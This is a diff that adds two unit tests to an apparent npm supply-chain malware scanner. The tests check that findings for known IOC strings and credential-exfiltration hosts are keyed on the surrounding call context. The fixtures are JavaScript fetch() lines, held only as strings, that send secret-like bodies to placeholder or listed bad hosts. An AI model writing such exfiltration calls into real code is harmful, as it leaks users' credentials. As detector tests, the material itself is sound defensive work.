@@ -759,6 +759,52 @@ def test_evidence_streams_overflow_count_is_exact():
     assert ev.count(" | ") <= snp._MAX_EVIDENCE_MATCHES  # display stays bounded
 
 
+def _ioc_pkg():
+    return snp.PackageEntry(
+        name = "evil",
+        version = "1.0.0",
+        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
+        integrity = "sha512-x",
+        lockfile_key = "node_modules/evil",
+    )
+
+
+def test_known_ioc_evidence_binds_context_not_bare_needle():
+    # A known-ioc-string finding keys on the matched-line context, not the bare
+    # constant, so a changed adjacent fetch/exfil body on the same call reopens
+    # while the IOC needle stays in place.
+    ioc = next(iter(snp.KNOWN_IOC_STRINGS))
+    old = f"fetch('http://h/'+'{ioc}', {{body: 'OLD'}})\n"
+    new = f"fetch('http://h/'+'{ioc}', {{body: 'EVIL'}})\n"
+
+    def key(text):
+        return [
+            snp._finding_key(f)
+            for f in snp.scan_text_blob(_ioc_pkg(), "package/x.js", text)
+            if f.pattern == "known-ioc-string"
+        ][0]
+
+    assert key(old) != key(new)
+
+
+def test_always_bad_host_evidence_binds_outbound_context():
+    # cred-surface-host (always-bad) binds the outbound call context, so altering
+    # the exfil body on the same call reopens the key instead of riding the bare
+    # host literal.
+    host = snp.CRED_HOST_ALWAYS_BAD[0][0]
+    old = f"fetch('https://{host}/x', {{body: secretOLD}})\n"
+    new = f"fetch('https://{host}/x', {{body: secretEVIL}})\n"
+
+    def key(text):
+        return [
+            snp._finding_key(f)
+            for f in snp.scan_text_blob(_ioc_pkg(), "package/x.js", text)
+            if f.pattern == "cred-surface-host (always-bad)"
+        ][0]
+
+    assert key(old) != key(new)
+
+
 def test_outbound_host_config_reindent_is_stable():
     # A formatter-only reindent of the bound continuation lines must NOT change
     # the key (whitespace is normalized before the logical-line digest).
